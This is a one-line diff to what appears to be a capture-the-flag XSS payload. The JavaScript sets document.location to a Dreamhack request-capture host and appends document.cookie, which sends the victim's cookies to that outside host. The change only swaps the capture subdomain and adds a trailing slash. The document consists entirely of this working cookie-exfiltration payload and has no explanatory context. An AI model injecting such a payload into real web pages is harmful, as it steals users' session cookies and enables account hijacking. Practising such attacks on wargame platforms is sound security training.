@@ -1,1 +1,1 @@
-document.location = "https://joufvhs.request.dreamhack.games" + document.cookie
+document.location = "https://pvdglvs.request.dreamhack.games/" + document.cookie
